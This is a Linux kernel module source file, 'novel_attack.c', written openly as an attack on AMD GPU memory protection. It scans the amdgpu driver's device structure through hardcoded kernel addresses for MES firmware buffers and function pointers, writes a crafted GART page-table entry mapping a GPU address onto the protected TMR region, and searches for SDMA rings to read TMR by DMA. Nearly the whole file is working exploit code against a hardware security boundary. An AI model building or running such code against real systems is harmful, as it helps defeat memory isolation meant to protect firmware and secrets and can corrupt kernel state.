/*
 * novel_attack.c — Two novel attack vectors:
 *
 * 1. MES DATA SECTION CORRUPTION: Find MES data buffer in VRAM,
 *    read dispatch tables, corrupt function pointers to redirect
 *    MES execution to our code in accessible VRAM.
 *
 * 2. SDMA TMR READ: Use GPU SDMA engine to copy from TMR to
 *    accessible VRAM. SDMA is a GPU-internal DMA engine that may
 *    bypass DF protection (which only blocks CPU reads).
 *
 * 3. GART PTE INJECTION: Add a page table entry mapping a GPU VA
 *    to TMR physical address. Submit compute shader that reads
 *    through this mapping — GPU MMU translation might bypass DF.
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);

static int __init na_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a, *psp;
    rreg_fn rr;
    wreg_fn wr;

    if (!p) return -ENODEV;
    a=(u8*)pci_get_drvdata(p)-0x10;
    psp=(u8*)a+0x3B910;
    rr=(rreg_fn)0xFFFFFFFFC0E28460ULL;
    wr=(wreg_fn)0xFFFFFFFFC0E28820ULL;

    pr_info("na: === NOVEL ATTACK VECTORS ===\n");

    /* ============================================
     * VECTOR 1: Find MES data section in VRAM
     * ============================================
     * adev->mes.data_fw_gpu_addr[pipe] and data_fw_ptr[pipe]
     * are stored in the mes sub-structure of adev.
     * The mes struct has ucode_fw_obj/gpu_addr/ptr and
     * data_fw_obj/gpu_addr/ptr for each pipe.
     *
     * Search adev for these by looking for VRAM/GTT addresses
     * near known MES fields. */
    pr_info("na: --- VECTOR 1: MES DATA SECTION ---\n");
    {
        /* The adev->mes struct is large. Let's search for MES-related
         * GPU addresses. MES data BO is in VRAM domain.
         * From mes_v12_0.c: adev->mes.data_fw_gpu_addr[pipe]
         *
         * Strategy: search for pairs of (BO_ptr, GPU_addr, CPU_ptr)
         * in adev, where GPU_addr is in VRAM range and CPU_ptr is
         * a valid kernel pointer. The data section is large (256KB+). */
        int off;
        int found = 0;

        /* Search for struct firmware pointers to MES blobs
         * MES firmware size: 643536 (pipe0) or 611920 (pipe1) */
        for (off = 0; off < 0x200000 && found < 10; off += 8) {
            u64 val = *(u64*)((u8*)a + off);

            /* Look for GPU addresses in VRAM range that could be
             * MES data/ucode buffers */
            if (val >= 0x8000000000ULL && val <= 0x97FF000000ULL &&
                (val & 0xFFF) == 0) {
                /* Check if prev is a BO ptr and next is a CPU ptr */
                u64 prev = *(u64*)((u8*)a + off - 8);
                u64 next = *(u64*)((u8*)a + off + 8);

                if ((prev >> 48) == 0xFFFF &&
                    ((next >> 48) == 0xFFFF || next == 0)) {
                    /* Check if the GPU addr is writable via MM_INDEX */
                    u32 gc = 0x2800;
                    /* Use MMIO to read VRAM at this address */
                    u32 vram_val = 0xDEAD;

                    /* Read via vram_read32 equivalent */
                    wr(a, gc + 0x1614 + 0x2000, lower_32_bits(val)); /* MM_INDEX */
                    vram_val = rr(a, gc + 0x1614 + 0x2001); /* MM_DATA */

                    if (next && (next >> 48) == 0xFFFF) {
                        /* Try reading via CPU ptr */
                        u32 cpu_val;
                        if (!copy_from_kernel_nofault(&cpu_val,
                            (void*)(unsigned long)next, 4)) {
                            pr_info("na: adev+0x%X: BO=%px GPU=0x%llX CPU=%px → [0]=0x%08X\n",
                                off, (void*)(unsigned long)prev, val,
                                (void*)(unsigned long)next, cpu_val);
                            found++;

                            /* Dump first 32 bytes via CPU ptr */
                            if (cpu_val != 0) {
                                u32 d[8]; int i;
                                for (i = 0; i < 8; i++)
                                    copy_from_kernel_nofault(&d[i],
                                        (void*)(unsigned long)(next + i*4), 4);
                                pr_info("na:   data: %08X %08X %08X %08X %08X %08X %08X %08X\n",
                                    d[0],d[1],d[2],d[3],d[4],d[5],d[6],d[7]);

                                /* Check if data contains function pointers
                                 * (values in kernel text range 0xFFFFFFFFC0...) */
                                {
                                    int j;
                                    for (j = 0; j < 256 && j < 0x10000/4; j++) {
                                        u64 qv;
                                        copy_from_kernel_nofault(&qv,
                                            (void*)(unsigned long)(next + j*8), 8);
                                        if ((qv >> 48) == 0xFFFF &&
                                            qv > 0xFFFFFFFFC0000000ULL &&
                                            qv < 0xFFFFFFFFD0000000ULL) {
                                            pr_info("na:   *** FUNC PTR at data+0x%X: 0x%llX ***\n",
                                                j*8, qv);
                                        }
                                        /* Also look for GPU VA pointers */
                                        if (qv >= 0x8000000000ULL &&
                                            qv <= 0x98000000000ULL &&
                                            (qv & 0xFFF) == 0) {
                                            pr_info("na:   GPU addr at data+0x%X: 0x%llX\n",
                                                j*8, qv);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /* ============================================
     * VECTOR 2: GART PTE INJECTION
     * ============================================
     * The GART page table maps GPU VAs to MC addresses.
     * If we add a PTE mapping to TMR MC address, and then
     * submit a GPU operation that reads through GART, the
     * GPU's memory access might bypass DF protection. */
    pr_info("na: --- VECTOR 2: GART PTE INJECTION ---\n");
    {
        u64 gart_kptr = *(u64*)((u8*)a + 0x3B900);
        u64 gart_mc = *(u64*)((u8*)a + 0x3B908);
        u64 tmr_bo_mc = 0x97E0000000ULL;

        pr_info("na: GART table kptr=0x%llX mc=0x%llX\n", gart_kptr, gart_mc);

        if (gart_kptr && (gart_kptr >> 48) == 0xFFFF) {
            /* Read first few GART PTEs */
            int i;
            pr_info("na: Current GART PTEs:\n");
            for (i = 0; i < 8; i++) {
                u64 pte;
                copy_from_kernel_nofault(&pte,
                    (void*)(unsigned long)(gart_kptr + i * 8), 8);
                if (pte)
                    pr_info("na:   PTE[%d] = 0x%016llX (phys=0x%llX valid=%d)\n",
                        i, pte, (pte >> 12) << 12, (int)(pte & 1));
            }

            /* Find an UNUSED PTE slot (value = 0) */
            {
                int free_idx = -1;
                for (i = 0; i < 32; i++) {
                    u64 pte;
                    copy_from_kernel_nofault(&pte,
                        (void*)(unsigned long)(gart_kptr + i * 8), 8);
                    if (pte == 0 && free_idx < 0) {
                        free_idx = i;
                        pr_info("na: Free PTE slot at index %d\n", i);
                    }
                }

                if (free_idx >= 0) {
                    /* Craft a PTE that maps to TMR MC address
                     * PTE format: phys_addr[51:12] | flags[11:0]
                     * flags: bit 0 = valid, bit 1 = system (0=VRAM)
                     * phys_addr = TMR_BO_MC >> 12 << 12 */
                    u64 tmr_pte = (tmr_bo_mc & ~0xFFFULL) | 0x1; /* valid, VRAM */
                    u64 orig_pte;

                    copy_from_kernel_nofault(&orig_pte,
                        (void*)(unsigned long)(gart_kptr + free_idx * 8), 8);

                    pr_info("na: Writing TMR PTE: 0x%016llX to slot %d\n",
                        tmr_pte, free_idx);

                    /* WRITE the PTE! */
                    copy_to_kernel_nofault(
                        (void*)(unsigned long)(gart_kptr + free_idx * 8),
                        &tmr_pte, 8);

                    /* Verify */
                    {
                        u64 rb;
                        copy_from_kernel_nofault(&rb,
                            (void*)(unsigned long)(gart_kptr + free_idx * 8), 8);
                        pr_info("na: PTE readback: 0x%016llX %s\n", rb,
                            rb == tmr_pte ? "*** PTE WRITTEN! ***" : "FAIL");
                    }

                    /* The GART GPU VA for this PTE would be:
                     * GART_VA_START + free_idx * 4096
                     * GART VA range starts at PT_START (0x7FFF00000) */
                    {
                        u64 tmr_gart_va = 0x7FFF00000ULL + free_idx * 0x1000;
                        pr_info("na: TMR mapped at GART VA 0x%llX\n", tmr_gart_va);
                        pr_info("na: A GPU shader reading from 0x%llX should hit TMR!\n",
                            tmr_gart_va);

                        /* Now: if we could submit a compute shader that reads
                         * from tmr_gart_va and writes to accessible VRAM,
                         * we'd dump TMR content via GPU-side access! */
                    }

                    /* RESTORE original PTE */
                    copy_to_kernel_nofault(
                        (void*)(unsigned long)(gart_kptr + free_idx * 8),
                        &orig_pte, 8);
                    pr_info("na: PTE restored\n");
                }
            }
        }
    }

    /* ============================================
     * VECTOR 3: SDMA RING PROBE
     * ============================================
     * Find SDMA ring buffer to submit DMA copy commands.
     * SDMA can copy between arbitrary VRAM addresses.
     * If SDMA can read TMR, we bypass DF protection. */
    pr_info("na: --- VECTOR 3: SDMA STATE ---\n");
    {
        /* SDMA registers are in a different IP block.
         * Find SDMA ring GPU address in adev. */
        int off;
        for (off = 0; off < 0x40000; off += 8) {
            u64 val = *(u64*)((u8*)a + off);
            /* SDMA ring buffer is typically in GART range */
            if (val >= 0x7FFF00000000ULL && val < 0x7FFF01000000ULL) {
                u64 prev = *(u64*)((u8*)a + off - 8);
                u64 next = *(u64*)((u8*)a + off + 8);
                if ((prev >> 48) == 0xFFFF || (next >> 48) == 0xFFFF) {
                    pr_info("na: SDMA ring? adev+0x%X: gpu=0x%llX prev=0x%llX next=0x%llX\n",
                        off, val, prev, next);
                }
            }
        }
    }

    pci_dev_put(p);
    return 0;
}
static void __exit na_exit(void) { pr_info("na: unloaded\n"); }
module_init(na_init); module_exit(na_exit);
